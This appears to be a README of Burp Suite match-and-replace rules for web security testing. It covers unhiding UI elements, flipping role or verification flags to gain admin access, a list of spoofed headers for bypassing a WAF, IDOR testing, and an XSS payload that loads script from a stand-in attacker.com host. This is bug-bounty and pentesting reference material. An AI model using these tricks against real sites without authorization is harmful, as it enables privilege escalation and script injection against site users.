# Match Replace Burp
Useful Match and Replace BurpSuite Rules

## Finding hidden buttons, forms, and other UI elements
Many websites contain hidden buttons, forms, and other UI elements like
```html
<div aria-hidden="true"></div>
<div style="visibility: hidden;"></div>
<div style="display: none;"></div>
<script>document.getElementbyTagName("test").hidden=true</script>
<button type="button" disabled>test</button>
```

* Show Hidden UI (1)

<img src="https://user-images.githubusercontent.com/36522826/166728753-b5b04276-fdf0-4102-bfee-7ac8fcd96cd4.png" width="400" />

* Show Hidden UI (2)

<img src="https://user-images.githubusercontent.com/36522826/166728896-5fb0c698-50bb-4213-b227-6389afaf3854.png" width="400" />

* Change disable to enable

<img src="https://user-images.githubusercontent.com/36522826/166729298-56e7272c-86c3-4f08-b712-606568a0367f.png" width="400" />

## Changing `false` to `true`
Sometimes we can get hidden features by changing from `false` to `true`. The example:

* Changing role from normal user to admin

<img src="https://user-images.githubusercontent.com/36522826/166739661-a6e54638-0fa1-464e-b765-4d52b7a223f7.png" width="400" />

* Make email verified

<img src="https://user-images.githubusercontent.com/36522826/166739292-7bf7bd71-3d7b-4ba0-91e2-97b679c41a83.png" width="400" />

## Bypass WAF
Bypassing WAF by adding some headers

* Adding `X-Forwarded-Host: 127.0.0.1`
<img src="https://user-images.githubusercontent.com/36522826/166742712-f3208448-ec62-424f-98ac-db3aecb1326b.png" width="400" />

> Create another rule but change the header to:
```
X-Forwarded-Port: 127.0.0.1
X-Forwarded-By: 127.0.0.1
X-Forwarded-Scheme: 127.0.0.1
X-Frame-Options: Allow
X-Forwarded-For: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Cluster-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Client-IP: 127.0.0.1
Origin: null
Origin: Domain.attacker.com
```

## Finding IDOR
By changing original user UUID to another UUID

<img src="https://user-images.githubusercontent.com/36522826/166742159-f740ec61-cb94-4ee7-bacf-7ed5b00e26bb.png" width="400" />

> Create another rule but change the `type` to "Request First Line"

## Finding XSS
By adding some XSS payload into the request

* Finding XSS on `User-Agent`

<img src="https://user-images.githubusercontent.com/36522826/166749425-b9accf44-a606-473d-94c6-8e9562e02c07.png" width="400" />

* Finding XSS on `Referer`

<img src="https://user-images.githubusercontent.com/36522826/166749753-d68eea0a-e290-4658-a2f1-cf66fcd89342.png" width="400" />

* Auto replace user input with XSS payload

<img src="https://user-images.githubusercontent.com/36522826/166752610-9d21d86e-49e5-4e8f-86bc-a9134350d46d.png" width="400" />

> So by just inputting the words `xss_payload` on the website it will be immediately replaced with `"><script src=https://attacker.com></script>`
> Change the XSS payload as you want

## MISC
Some random match and replace rules
* Finding [CVE-2021-44221](https://github.com/advisories/GHSA-2q3f-cqqf-9p6p)

<img src="https://user-images.githubusercontent.com/36522826/166748175-6782ce51-b10f-4b1d-b8a3-610ef142d567.png" width="400" />

> Create some another rules to look for them in headers, parameters and more. Because log4j can be found anywhere

* Help companies to identify your traffic and separate them from malicious traffic by adding a custom header

<img src="https://user-images.githubusercontent.com/36522826/166796789-e184716f-00a3-428d-9323-bcd985556798.png" width="400" />

References:
- https://twitter.com/PTestical/status/1413497660133318659
- https://twitter.com/HolyBugx/status/1355472991061213184
- https://twitter.com/intigriti/status/1192103070072741894
- https://twitter.com/payloadartist/status/1469582893772984322
- https://twitter.com/payloadartist/status/1422247377516122114
- https://twitter.com/hackerscrolls/status/1247177578269597698

> Soon will be updated again
